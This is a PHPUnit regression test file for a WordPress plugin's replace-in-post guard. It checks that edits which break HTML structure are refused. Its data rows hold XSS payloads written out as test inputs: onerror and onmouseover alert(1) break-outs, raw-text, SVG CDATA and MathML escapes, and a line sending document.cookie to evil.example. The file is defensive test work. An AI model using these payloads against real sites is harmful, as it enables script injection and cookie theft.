<?php
/**
 * The B2-02 regression corpus: every case the replace-in-post structure guard has ever protected.
 *
 * ROWS IN THIS FILE ARE APPEND-ONLY. NEVER DELETE ONE.
 *
 * Read that literally, and here is why it is worth the inconvenience. This guard has now been
 * written three times. Each rewrite fixed the case the current review round had found and silently
 * dropped a case an earlier version was already protecting, because the suite only ever pinned the
 * most recent round's findings. The second attempt deleted the first attempt's raw-text body
 * protection with all four gates green, and the next round rediscovered it as a fresh HIGH.
 *
 * So this file is not a list of tests. It is the union of every case any version of this guard has
 * protected or got wrong, each labelled with where it came from, pinned simultaneously, so that a
 * fourth rewrite fails loudly instead of quietly shipping a hole. If you are here to rewrite the
 * guard: add rows, do not remove them. A row you cannot satisfy is a conversation to have, not a
 * line to delete.
 *
 * There are two providers, and the split is deliberate.
 *
 * The ABILITY rows go through the whole ability and assert on what reaches post_content. That is
 * the product's real behaviour and the only thing a caller can actually observe.
 *
 * The GUARD rows call aafm_replacement_preserves_structure() with the document pair directly. They
 * exist because wp_kses_post() runs before the guard does, and it neutralises some payloads on the
 * way in - the round-7 SVG CDATA payload arrives as escaped text, for instance. Pinning those only
 * end-to-end would quietly turn them into assertions about kses instead of about the guard, which
 * is the vacuous-coverage trap this whole file exists to prevent. The guard has its own contract
 * and these rows hold it to it, whatever happens to sit in front of it later.
 *
 * @package AgentAbilitiesForMCP
 */

declare( strict_types=1 );

namespace AAFM\Tests\Abilities;

use AAFM\Tests\TestCase;
use WP_Error;

final class ReplaceInPostStructureTest extends TestCase {

	/**
	 * The guard's own contract: given a document and a splice, does the structure survive?
	 *
	 * Each row is [ before, search, inserted, structure_survives ]. The inserted text is used
	 * verbatim, NOT run through kses, because this is the guard's contract and not the ability's.
	 *
	 * @return array<string,array{0:string,1:string,2:string,3:bool}>
	 */
	public function provide_guard_cases(): array {
		return array(
			// R6-2: the tag does not end at the first `>` when that `>` is inside a quoted value.
			'R6-2 quoted attribute contains a bracket' => array(
				'<p>hi</p><a title="a > b" href="MARK">x</a>',
				'MARK',
				'x" onmouseover="alert(1)" data-z="',
				false,
			),
			// R6-4: a literal `<` in prose is not a tag opener, and must not cost a caller their edit.
			'R6-4 literal bracket in prose'            => array(
				'<p>if x < y then MARK holds</p>',
				'MARK',
				'the bound',
				true,
			),
			// Round 6: every original token survives, yet the rest of the comment became live markup.
			'round6 comment ended early'               => array(
				'<p>a</p><!-- note MARK end --><p>b</p>',
				'MARK',
				'--><img src=x onerror=alert(1)><!--',
				false,
			),

			/*
			 * Attempt 1 protected these four and attempt 2 dropped all of them. Core reports a
			 * raw-text element as ONE token whose whole body is its modifiable text - there is no
			 * closer token at all - so a signature that reads only names and attributes cannot see
			 * a splice in here.
			 */
			'attempt1 script body'                     => array(
				'<p>hello</p><script>var a = "MARK";</script>',
				'MARK',
				'x"; fetch("//evil.example/"+document.cookie); var b="y',
				false,
			),
			'attempt1 style body'                      => array(
				'<p>hello</p><style>.a{color:MARK}</style>',
				'MARK',
				'red} body{background:url(//evil.example/x)} .b{color:blue',
				false,
			),
			'attempt1 title body'                      => array(
				'<title>MARK</title><p>hello</p>',
				'MARK',
				'a</title><img src=x onerror=alert(1)><title>b',
				false,
			),
			'attempt1 textarea body'                   => array(
				'<p>hi</p><textarea>MARK</textarea>',
				'MARK',
				'a</textarea><img src=x onerror=alert(1)><textarea>b',
				false,
			),

			/*
			 * The four rows above all splice a closer into the body, which adds tokens, so exact
			 * equality would refuse them even if the body were left out of the signature entirely.
			 * These two change nothing BUT the body. They are the rows that go red the moment
			 * somebody drops raw-text bodies again, which is precisely what attempt 2 did.
			 */
			'raw-text body alone, title'               => array(
				'<title>MARK</title><p>hello</p>',
				'MARK',
				'a different document title',
				false,
			),
			'raw-text body alone, textarea'            => array(
				'<p>hi</p><textarea>MARK</textarea>',
				'MARK',
				'prefilled with something else',
				false,
			),

			/*
			 * Round 7, and never protected by either previous attempt. What actually let these
			 * through was not the missing namespace but the old count-and-subsequence arithmetic:
			 * a break-out that re-opens the subtree leaves every original token present and in
			 * order, and the totals balance. Demanding exact equality is what closes them, and
			 * removing the tree signature entirely still leaves both refused. Worth knowing before
			 * anybody trims the guard on the theory that the tree half is carrying these.
			 */
			'round7 svg cdata splice'                  => array(
				'<p>hi</p><svg><desc>MARK</desc></svg>',
				'MARK',
				'<![CDATA[</desc><script>alert(1)</script>]]>',
				false,
			),
			'round7 foreign self-closing state'        => array(
				'<p>hi</p><svg><circle r="1"/>MARK</svg>',
				'MARK',
				'</svg><p>injected</p><svg>',
				false,
			),
			// The baseline. If these ever fail the guard has become useless in the other direction.
			'baseline ordinary body text'              => array(
				'<p>The quick MARK fox</p>',
				'MARK',
				'brown',
				true,
			),
			'baseline many occurrences all in text'    => array(
				'<p>MARK a</p><p>MARK b</p><p>c MARK</p>',
				'MARK',
				'word',
				true,
			),

			/*
			 * Added on the third attempt. The raw-text set was read out of core rather than
			 * recalled, and it is larger than the four attempt 1 knew about. NOSCRIPT is in here
			 * for the opposite reason: core parses with scripting disabled and descends into it, so
			 * its contents are ordinary tokens and are covered by the ordinary path.
			 */
			'raw-text set xmp body'                    => array(
				'<p>hi</p><xmp>MARK</xmp>',
				'MARK',
				'a</xmp><img src=x onerror=alert(1)><xmp>b',
				false,
			),
			'raw-text set iframe body'                 => array(
				'<p>hi</p><iframe>MARK</iframe>',
				'MARK',
				'a</iframe><img src=x onerror=alert(1)><iframe>b',
				false,
			),
			'raw-text set noembed body'                => array(
				'<p>hi</p><noembed>MARK</noembed>',
				'MARK',
				'a</noembed><img src=x onerror=alert(1)><noembed>b',
				false,
			),
			'raw-text set noframes body'               => array(
				'<p>hi</p><noframes>MARK</noframes>',
				'MARK',
				'a</noframes><img src=x onerror=alert(1)><noframes>b',
				false,
			),
			'noscript is not raw text but still held'  => array(
				'<p>hi</p><noscript>MARK</noscript>',
				'MARK',
				'<img src=x onerror=alert(1)>',
				false,
			),
			'mathml break-out'                         => array(
				'<p>hi</p><math><mi>MARK</mi></math>',
				'MARK',
				'</mi></math><img src=x onerror=alert(1)><math><mi>',
				false,
			),
			// A block comment carries the block's attributes. Editing them is editing structure.
			'gutenberg block comment attributes'       => array(
				'<!-- wp:image {"id":7,"alt":"MARK"} --><figure><img src="/x.jpg"/></figure><!-- /wp:image -->',
				'MARK',
				'evil" onerror="alert(1)',
				false,
			),
			'attribute name rather than value'         => array(
				'<p data-MARK="x">body</p>',
				'MARK',
				'onmouseover" onfocus="alert(1)',
				false,
			),
			'search term spans a tag boundary'         => array(
				'<p>a</p><p>b</p>',
				'</p><p>',
				'</p><div>x</div><p>',
				false,
			),
			// Fail closed. Neither of these documents can be parsed to the end with confidence.
			'fail closed on unparseable markup'        => array(
				'<p>MARK</p><plaintext>tail',
				'MARK',
				'safe',
				false,
			),
			'fail closed on a truncated raw-text body' => array(
				'<p>hi</p><script>var a = "MARK";',
				'MARK',
				'x',
				false,
			),

			/*
			 * The third attempt's deliberate behaviour change: a replacement that brings markup is
			 * refused even when kses is happy with it, because bringing markup IS a structural
			 * change. The previous version allowed it by letting the token count grow, and that
			 * allowance is exactly what the two foreign-content rows above exploited.
			 */
			'replacement introduces markup'            => array(
				'<p>The MARK fox</p>',
				'MARK',
				'<strong>brown</strong>',
				false,
			),
			// The R6-4 family again: a bracket that cannot open a tag must stay affordable.
			'replacement contains an inert bracket'    => array(
				'<p>bound MARK stated</p>',
				'MARK',
				'a < b and c',
				true,
			),
			'replacement is empty'                     => array(
				'<p>drop MARK here</p>',
				'MARK',
				'',
				true,
			),
		);
	}

	/**
	 * Every guard row, held against the guard directly.
	 *
	 * @dataProvider provide_guard_cases
	 *
	 * @param string $before   Original document.
	 * @param string $search   Literal search term.
	 * @param string $inserted Text spliced in, verbatim.
	 * @param bool   $survives Whether the structure must be judged intact.
	 */
	public function test_guard_contract( string $before, string $search, string $inserted, bool $survives ): void {
		$after = str_replace( $search, $inserted, $before );

		$this->assertNotSame( $before, $after, 'the row must actually change the document, or it asserts nothing.' );
		$this->assertSame(
			$survives,
			aafm_replacement_preserves_structure( $before, $after ),
			$survives
				? 'this replacement only touches text and must be allowed.'
				: 'this replacement changes structure and must be refused.'
		);
	}

	/**
	 * The same corpus as the caller sees it, end to end, asserted on what reaches post_content.
	 *
	 * Each row is [ before, search, replace, accepted ]. Only the rows that survive wp_kses_post()
	 * intact appear here; the ones kses defuses on the way in are held by the guard provider above,
	 * where they still mean something.
	 *
	 * @return array<string,array{0:string,1:string,2:string,3:bool}>
	 */
	public function provide_ability_cases(): array {
		return array(
			'R6-2 attribute break-out'              => array(
				'<a href="https://example.com" title="MARK">link</a>',
				'MARK',
				'x" onmouseover="alert(1)" data-z="',
				false,
			),
			'R6-4 literal bracket in prose'         => array(
				'<p>if x < y then MARK holds</p>',
				'MARK',
				'the bound',
				true,
			),
			'attempt1 script body'                  => array(
				'<p>hello</p><script>var a = "MARK";</script>',
				'MARK',
				'x"; fetch("//evil.example/"+document.cookie); var b="y',
				false,
			),
			'attempt1 style body'                   => array(
				'<p>hello</p><style>.a{color:MARK}</style>',
				'MARK',
				'red} body{background:url(//evil.example/x)} .b{color:blue',
				false,
			),
			'attempt1 title body'                   => array(
				'<title>MARK</title><p>hello</p>',
				'MARK',
				'a</title><img src=x onerror=alert(1)><title>b',
				false,
			),
			'attempt1 textarea body'                => array(
				'<p>hi</p><textarea>MARK</textarea>',
				'MARK',
				'a</textarea><img src=x onerror=alert(1)><textarea>b',
				false,
			),
			'mathml break-out'                      => array(
				'<p>hi</p><math><mi>MARK</mi></math>',
				'MARK',
				'</mi></math><img src=x onerror=alert(1)><math><mi>',
				false,
			),
			'gutenberg block comment attributes'    => array(
				'<!-- wp:image {"id":7,"alt":"MARK"} --><figure><img src="/x.jpg"/></figure><!-- /wp:image -->',
				'MARK',
				'evil" onerror="alert(1)',
				false,
			),
			'replacement introduces markup'         => array(
				'<p>The MARK fox</p>',
				'MARK',
				'<strong>brown</strong>',
				false,
			),
			'baseline ordinary body text'           => array(
				'<p>The quick MARK fox</p>',
				'MARK',
				'brown',
				true,
			),
			'baseline many occurrences all in text' => array(
				'<p>MARK a</p><p>MARK b</p><p>c MARK</p>',
				'MARK',
				'word',
				true,
			),
		);
	}

	/**
	 * Every deliverable row, held against what the ability actually stores.
	 *
	 * @dataProvider provide_ability_cases
	 *
	 * @param string $before   Stored post_content before the call.
	 * @param string $search   Literal search term.
	 * @param string $replace  Raw replacement, before kses.
	 * @param bool   $accepted Whether the ability must apply the replacement.
	 */
	public function test_ability_outcome( string $before, string $search, string $replace, bool $accepted ): void {
		/*
		 * An administrator on purpose. kses_init() attaches wp_filter_post_kses only for users who
		 * LACK unfiltered_html, so core's save filters are not a net for anybody who can reach this
		 * ability, and a test acting as a lesser user would be measuring core rather than the guard.
		 */
		wp_set_current_user( self::factory()->user->create( array( 'role' => 'administrator' ) ) );
		$this->assertTrue( current_user_can( 'unfiltered_html' ), 'Precondition: core kses save filters are not in play.' );

		$id = (int) self::factory()->post->create( array( 'post_content' => $before ) );
		$this->assertSame( $before, (string) get_post( $id )->post_content, 'Precondition: the document stored verbatim.' );

		$out = aafm_exec_replace_in_post(
			array(
				'post_id' => $id,
				'search'  => $search,
				'replace' => $replace,
			)
		);

		$stored = (string) get_post( $id )->post_content;

		if ( ! $accepted ) {
			$this->assertInstanceOf( WP_Error::class, $out, 'a structural replacement must be refused.' );
			$this->assertSame( 'aafm_replace_inside_markup', $out->get_error_code() );
			$this->assertSame( $before, $stored, 'a refused replacement must leave post_content byte-for-byte unchanged.' );
			return;
		}

		$this->assertIsArray( $out, 'a text-only replacement must go through.' );
		$this->assertSame(
			str_replace( $search, wp_kses_post( $replace ), $before ),
			$stored,
			'an accepted replacement must change the matched spans and nothing else.'
		);
	}

	/**
	 * The raw-text set is read from core, so pin what it is rather than trusting the comment.
	 *
	 * If a future core release moves an element in or out of this set, the guard's blind spot moves
	 * with it. This row is the tripwire.
	 */
	public function test_raw_text_element_set_matches_core(): void {
		$this->assertSame(
			array( 'SCRIPT', 'TEXTAREA', 'TITLE', 'IFRAME', 'NOEMBED', 'NOFRAMES', 'STYLE', 'XMP' ),
			array_keys( aafm_html_raw_text_elements() )
		);

		foreach ( array_keys( aafm_html_raw_text_elements() ) as $tag ) {
			$lower = strtolower( $tag );
			$flat  = aafm_html_flat_signature( "<{$lower}>body</{$lower}>" );

			$this->assertIsArray( $flat );
			$this->assertCount( 1, $flat, "core must report {$tag} as a single atomic token." );
			$this->assertStringContainsString( ':body=body', $flat[0], "the {$tag} body must be in the signature." );
		}

		// NOSCRIPT is the documented exception: core descends into it, so it has a closer token.
		$noscript = aafm_html_flat_signature( '<noscript>body</noscript>' );
		$this->assertIsArray( $noscript );
		$this->assertCount( 2, $noscript, 'core descends into NOSCRIPT, so it is not raw text here.' );
	}

	/**
	 * Both signatures must report failure rather than a partial answer, so the guard can fail closed.
	 */
	public function test_signatures_report_failure_rather_than_a_partial_answer(): void {
		$this->assertNull(
			aafm_html_flat_signature( '<p>hi</p><script>never closed' ),
			'a document that runs out mid-token has no trustworthy flat signature.'
		);
		$this->assertNull(
			aafm_html_tree_signature( '<p>hi</p><plaintext>tail' ),
			'markup the tree parser declines has no trustworthy tree signature.'
		);
	}
}
